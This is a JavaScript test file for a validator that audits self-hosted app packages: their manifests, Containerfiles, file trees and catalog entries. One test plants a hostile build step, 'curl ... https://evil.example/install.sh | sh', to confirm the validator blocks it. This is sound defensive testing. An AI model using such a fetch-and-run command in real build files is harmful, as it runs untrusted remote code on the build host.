import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import {
  validateCatalogStructure,
  validateContainerfile,
  validateLocalPocketDir,
  validatePocketManifest,
  validateTreeEntries,
} from "./validate-catalog.mjs";

const VALID_MANIFEST = `
apiVersion: pockets.dev/v1alpha1
kind: Pocket
metadata:
  id: coinkiwi
  name: CoinKiwi
  version: 0.4.0
  description: Self-hosted cryptocurrency portfolio and price tracker.
runtime:
  image: localhost/pockets-coinkiwi:0.4.0
  architectures: [arm64, amd64]
web:
  port: 8080
  healthcheck: /health
storage:
  name: coinkiwi-data
  path: /data
previewApis:
  - host: api.livecoinwatch.com
    name: Live Coin Watch
    purpose: Fetch live market prices
runtimeVariables:
  - name: LIVECOINWATCH_API_KEY
    kind: secret
    purpose: API key for Live Coin Watch
    required: true
`;

const VALID_CONTAINERFILE = `
FROM node:22-alpine
WORKDIR /app
COPY --chown=node:node . .
RUN mkdir -p /data && chown node:node /data
USER node
EXPOSE 8080
CMD ["node", "server.js"]
`;

test("accepts a valid pocket.yaml manifest", () => {
  const res = validatePocketManifest(VALID_MANIFEST);
  assert.equal(res.ok, true, res.errors.join("; "));
  assert.equal(res.manifest.metadata.id, "coinkiwi");
});

test("rejects YAML anchors, unknown fields, reserved env vars, and private hosts", () => {
  const withAnchor = VALID_MANIFEST + "\nfoo: &anchor bar\n";
  assert.equal(validatePocketManifest(withAnchor).ok, false);

  const withReservedEnv = VALID_MANIFEST.replace("LIVECOINWATCH_API_KEY", "POCKETS_SECRET");
  const envRes = validatePocketManifest(withReservedEnv);
  assert.equal(envRes.ok, false);
  assert.ok(envRes.errors.some((e) => e.includes("non-reserved")));

  const withPrivateHost = VALID_MANIFEST.replace("api.livecoinwatch.com", "secret.internal");
  const hostRes = validatePocketManifest(withPrivateHost);
  assert.equal(hostRes.ok, false);
  assert.ok(hostRes.errors.some((e) => e.includes("public hostname")));

  for (const placeholder of [
    "A minimal Pocket starter",
    "A small persistent web app you control.",
  ]) {
    const withPlaceholder = VALID_MANIFEST.replace(
      "Self-hosted cryptocurrency portfolio and price tracker.",
      placeholder,
    );
    const phRes = validatePocketManifest(withPlaceholder);
    assert.equal(phRes.ok, false);
    assert.ok(phRes.errors.some((e) => e.includes("placeholder")));
  }
});

test("Containerfile audit enforces non-root USER and blocks dangerous instructions", () => {
  assert.equal(validateContainerfile(VALID_CONTAINERFILE).ok, true);

  const rootCf = VALID_CONTAINERFILE.replace("USER node", "USER root");
  assert.equal(validateContainerfile(rootCf).ok, false);

  const missingUser = VALID_CONTAINERFILE.replace("USER node\n", "");
  assert.equal(validateContainerfile(missingUser).ok, false);

  const curlPipeSh = VALID_CONTAINERFILE.replace(
    "RUN mkdir -p /data && chown node:node /data",
    "RUN curl -fsSL https://evil.example/install.sh | sh",
  );
  assert.equal(validateContainerfile(curlPipeSh).ok, false);

  const hardcodedSecret = VALID_CONTAINERFILE + "\nENV LIVECOINWATCH_API_KEY=sk-live-12345\n";
  assert.equal(validateContainerfile(hardcodedSecret).ok, false);

  const remoteAdd = VALID_CONTAINERFILE.replace("COPY --chown=node:node . .", "ADD https://example.com/a.tar.gz /app");
  assert.equal(validateContainerfile(remoteAdd).ok, false);
});

test("tree audit rejects symlinks, committed secrets, and missing README/LICENSE", () => {
  const okTree = validateTreeEntries([
    { path: "README.md", size: 200, isSymlink: false },
    { path: "LICENSE", size: 1000, isSymlink: false },
    { path: "pocket.yaml", size: 400, isSymlink: false },
  ]);
  assert.equal(okTree.ok, true, okTree.errors.join("; "));

  const badTree = validateTreeEntries([
    { path: "pocket.yaml", size: 400, isSymlink: false },
    { path: ".env", size: 50, isSymlink: false },
    { path: "certs/server.key", size: 100, isSymlink: false },
    { path: "link", size: 10, isSymlink: true },
  ]);
  assert.equal(badTree.ok, false);
  assert.ok(badTree.errors.some((e) => e.includes("symbolic link")));
  assert.ok(badTree.errors.some((e) => e.includes(".env")));
  assert.ok(badTree.errors.some((e) => e.includes("server.key")));
  assert.ok(badTree.errors.some((e) => e.includes("README.md")));
  assert.ok(badTree.errors.some((e) => e.includes("LICENSE")));
});

test("catalog structure blocks duplicate repos and self-assigned verified:true on PRs", () => {
  const base = Buffer.from(
    JSON.stringify({
      version: 1,
      pockets: [{ repo: "runpockets/coinkiwi", verified: true }],
    }),
  );

  const validCommunityPr = Buffer.from(
    JSON.stringify({
      version: 1,
      pockets: [
        { repo: "runpockets/coinkiwi", verified: true },
        { repo: "alice/notes-app", verified: false },
      ],
    }),
  );
  assert.equal(validateCatalogStructure(validCommunityPr, base).ok, true);

  const selfVerifiedPr = Buffer.from(
    JSON.stringify({
      version: 1,
      pockets: [
        { repo: "runpockets/coinkiwi", verified: true },
        { repo: "alice/notes-app", verified: true },
      ],
    }),
  );
  const res = validateCatalogStructure(selfVerifiedPr, base);
  assert.equal(res.ok, false);
  assert.ok(res.errors.some((e) => e.includes('"verified": false')));

  const duplicateRepo = Buffer.from(
    JSON.stringify({
      version: 1,
      pockets: [
        { repo: "runpockets/coinkiwi", verified: true },
        { repo: "RunPockets/CoinKiwi", verified: false },
      ],
    }),
  );
  assert.equal(validateCatalogStructure(duplicateRepo, base).ok, false);
});

test("validateLocalPocketDir validates a complete local Pocket directory end-to-end", () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "pockets-hub-val-"));
  try {
    fs.writeFileSync(path.join(tmp, "pocket.yaml"), VALID_MANIFEST);
    fs.writeFileSync(path.join(tmp, "Containerfile"), VALID_CONTAINERFILE);
    fs.writeFileSync(path.join(tmp, "README.md"), "# CoinKiwi\n");
    fs.writeFileSync(path.join(tmp, "LICENSE"), "Apache-2.0\n");

    const ok = validateLocalPocketDir(tmp);
    assert.equal(ok.ok, true, ok.errors.join("; "));
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});
